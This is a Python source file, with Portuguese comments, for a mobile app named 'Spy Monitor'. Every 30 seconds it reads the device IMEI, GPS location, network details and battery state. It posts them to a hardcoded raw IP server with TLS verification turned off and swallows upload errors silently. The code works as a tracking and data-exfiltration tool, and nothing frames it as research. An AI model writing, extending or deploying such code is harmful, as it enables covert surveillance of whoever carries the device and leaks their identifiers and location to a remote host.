import toga
from toga.style import Pack
from toga.style.pack import COLUMN, CENTER
import time
import requests
import threading
import json
from datetime import datetime
import uuid
import platform

# Configuração do servidor externo
SERVER_URL = "https://147.79.111.118"

class SpyMonitor(toga.App):
    def startup(self):
        """Inicializar a aplicação de monitoramento"""
        self.main_window = toga.MainWindow(title=self.formal_name, size=(400, 600))
        
        # Variáveis de controle
        self.is_monitoring = False
        self.device_id = self.get_device_id()
        self.collection_count = 0
        
        # Criar interface principal
        main_box = toga.Box(style=Pack(direction=COLUMN, background_color='#F0F0F0', margin=20))
        
        # Título
        title_label = toga.Label(
            '📱 Spy Monitor',
            style=Pack(
                text_align=CENTER,
                font_size=24,
                font_weight='bold',
                color='#2E86C1',
                padding=(0, 0, 20, 0)
            )
        )
        main_box.add(title_label)
        
        # Status
        self.status_label = toga.Label(
            'Status: Parado',
            style=Pack(
                text_align=CENTER,
                font_size=16,
                font_weight='bold',
                color='#E74C3C',
                padding=(0, 0, 20, 0)
            )
        )
        main_box.add(self.status_label)
        
        # Botão Iniciar/Parar
        self.monitor_button = toga.Button(
            '▶️ Iniciar Monitoramento',
            on_press=self.toggle_monitoring,
            style=Pack(
                font_size=16,
                font_weight='bold',
                background_color='#27AE60',
                color='#FFFFFF',
                padding=15,
                margin=(0, 0, 20, 0)
            )
        )
        main_box.add(self.monitor_button)
        
        # Área de logs
        logs_title = toga.Label(
            '📋 Logs:',
            style=Pack(
                font_size=14,
                font_weight='bold',
                color='#2C3E50',
                padding=(20, 0, 5, 0)
            )
        )
        main_box.add(logs_title)
        
        self.logs_text = toga.MultilineTextInput(
            readonly=True,
            style=Pack(
                font_size=10,
                background_color='#FFFFFF',
                color='#000000',
                padding=10,
                flex=1
            )
        )
        main_box.add(self.logs_text)
        
        self.add_log("App iniciado")
        self.add_log(f"Device ID: {self.device_id}")
        self.add_log(f"Servidor: {SERVER_URL}")
        
        self.main_window.on_close = self.on_close
        self.main_window.content = main_box
        self.main_window.show()
    
    def get_device_id(self):
        """Gera ID único do dispositivo"""
        try:
            # Tenta obter IMEI real (Android)
            if platform.system() == 'Android':
                from android.permissions import request_permission, Permission
                from jnius import autoclass
                
                try:
                    request_permission(Permission.READ_PHONE_STATE)
                    TelephonyManager = autoclass('android.telephony.TelephonyManager')
                    Context = autoclass('android.content.Context')
                    PythonActivity = autoclass('org.kivy.android.PythonActivity')
                    
                    activity = PythonActivity.mActivity
                    tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
                    device_id = tm.getDeviceId()
                    
                    if device_id:
                        return device_id
                except:
                    pass
            
            # Fallback: gerar ID único baseado no dispositivo
            import hashlib
            unique_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
            return hashlib.md5(unique_string.encode()).hexdigest()[:15]
        except:
            return str(uuid.uuid4())[:15]
    
    def add_log(self, message):
        """Adiciona mensagem aos logs"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        
        current_text = self.logs_text.value or ""
        lines = (current_text + log_entry).split('\n')
        if len(lines) > 20:
            lines = lines[-20:]
        self.logs_text.value = '\n'.join(lines)
    
    def toggle_monitoring(self, widget):
        """Alterna monitoramento"""
        if not self.is_monitoring:
            self.start_monitoring()
        else:
            self.stop_monitoring()
    
    def start_monitoring(self):
        """Inicia monitoramento"""
        self.is_monitoring = True
        self.status_label.text = 'Status: Ativo'
        self.status_label.style.color = '#27AE60'
        self.monitor_button.text = '⏹️ Parar Monitoramento'
        self.monitor_button.style.background_color = '#E74C3C'
        
        # Testar conexão com servidor
        self.test_server_connection()
        
        # Iniciar thread de monitoramento
        self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
        self.monitoring_thread.start()
        
        self.add_log("Monitoramento iniciado")
    
    def stop_monitoring(self):
        """Para monitoramento"""
        self.is_monitoring = False
        self.status_label.text = 'Status: Parado'
        self.status_label.style.color = '#E74C3C'
        self.monitor_button.text = '▶️ Iniciar Monitoramento'
        self.monitor_button.style.background_color = '#27AE60'
        self.add_log("Monitoramento parado")
    
    def test_server_connection(self):
        """Testa conexão com servidor"""
        try:
            response = requests.get(f"{SERVER_URL}/api/test/", timeout=10)
            if response.status_code == 200:
                self.add_log("✅ Servidor conectado")
            else:
                self.add_log(f"⚠️ Servidor resposta: {response.status_code}")
        except requests.exceptions.RequestException as e:
            self.add_log(f"❌ Erro conexão: {str(e)[:50]}")
    
    def monitoring_loop(self):
        """Loop principal de monitoramento"""
        while self.is_monitoring:
            try:
                time.sleep(30)  # Coleta a cada 30 segundos
                
                if self.is_monitoring:
                    self.collect_and_send_data()
                    
            except Exception as e:
                self.add_log(f"Erro no loop: {str(e)[:50]}")
                time.sleep(10)
    
    def collect_and_send_data(self):
        """Coleta e envia dados para o servidor"""
        try:
            # Dados básicos do dispositivo
            device_data = {
                'imei': self.device_id,
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'version': platform.version()
            }
            
            # Enviar dados básicos
            self.send_device_info(device_data)
            
            # Coletar localização (se disponível)
            location = self.get_location()
            if location:
                self.send_location(location)
            
            # Coletar informações de rede
            network_info = self.get_network_info()
            if network_info:
                self.send_network_info(network_info)
            
            # Coletar dados de bateria (Android)
            battery_info = self.get_battery_info()
            if battery_info:
                self.send_battery_info(battery_info)
            
            self.collection_count += 1
            self.add_log(f"✅ Dados enviados #{self.collection_count}")
            
        except Exception as e:
            self.add_log(f"Erro coleta: {str(e)[:50]}")
    
    def get_location(self):
        """Obtém localização do dispositivo"""
        try:
            if platform.system() == 'Android':
                from plyer import gps
                
                # Configurar GPS
                gps.configure(on_location=self.on_location_update)
                gps.start(minTime=1000, minDistance=1)
                
                # Aguardar um pouco pela localização
                time.sleep(2)
                gps.stop()
                
                if hasattr(self, 'last_location'):
                    return self.last_location
            
            return None
        except Exception as e:
            self.add_log(f"Erro GPS: {str(e)[:30]}")
            return None
    
    def on_location_update(self, **kwargs):
        """Callback para atualização de localização"""
        self.last_location = {
            'latitude': kwargs.get('lat'),
            'longitude': kwargs.get('lon'),
            'accuracy': kwargs.get('accuracy')
        }
    
    def get_network_info(self):
        """Obtém informações de rede"""
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            return {
                'hostname': hostname,
                'local_ip': local_ip,
                'timestamp': datetime.now().isoformat()
            }
        except:
            return None
    
    def get_battery_info(self):
        """Obtém informações da bateria (Android)"""
        try:
            if platform.system() == 'Android':
                from plyer import battery
                
                battery_status = battery.status
                return {
                    'level': battery_status.get('percentage', 0),
                    'charging': battery_status.get('isCharging', False),
                    'timestamp': datetime.now().isoformat()
                }
            return None
        except:
            return None
    
    def send_device_info(self, data):
        """Envia informações básicas do dispositivo"""
        try:
            url = f"{SERVER_URL}/api/device_info/"
            response = requests.post(url, json=data, timeout=10, verify=False)
            
            if response.status_code not in [200, 201]:
                self.add_log(f"⚠️ Device info: {response.status_code}")
                
        except requests.exceptions.RequestException:
            pass  # Falha silenciosa para não poluir logs
    
    def send_location(self, location_data):
        """Envia dados de localização"""
        try:
            data = {
                'imei': self.device_id,
                'latitude': location_data['latitude'],
                'longitude': location_data['longitude'],
                'accuracy': location_data.get('accuracy'),
                'timestamp': datetime.now().isoformat()
            }
            
            url = f"{SERVER_URL}/api/localizacao/"
            response = requests.post(url, json=data, timeout=10, verify=False)
            
            if response.status_code in [200, 201]:
                self.add_log("📍 Localização enviada")
            else:
                self.add_log(f"⚠️ Localização: {response.status_code}")
                
        except requests.exceptions.RequestException:
            pass
    
    def send_network_info(self, network_data):
        """Envia informações de rede"""
        try:
            data = {
                'imei': self.device_id,
                'ip_local': network_data['local_ip'],
                'hostname': network_data['hostname'],
                'timestamp': network_data['timestamp']
            }
            
            url = f"{SERVER_URL}/api/atividade_rede/"
            response = requests.post(url, json=data, timeout=10, verify=False)
            
            if response.status_code in [200, 201]:
                self.add_log("🌐 Rede enviada")
                
        except requests.exceptions.RequestException:
            pass
    
    def send_battery_info(self, battery_data):
        """Envia informações da bateria"""
        try:
            data = {
                'imei': self.device_id,
                'bateria_nivel': battery_data['level'],
                'bateria_carregando': battery_data['charging'],
                'timestamp': battery_data['timestamp']
            }
            
            url = f"{SERVER_URL}/api/device_info/"
            response = requests.post(url, json=data, timeout=10, verify=False)
            
            if response.status_code in [200, 201]:
                self.add_log(f"🔋 Bateria: {battery_data['level']}%")
                
        except requests.exceptions.RequestException:
            pass
    
    def on_close(self, widget):
        """Fechamento da aplicação"""
        self.is_monitoring = False
        self.add_log("App fechado")

def main():
    return SpyMonitor('Spy Monitor', 'org.beeware.spymonitor')

if __name__ == '__main__':
    main().main_loop()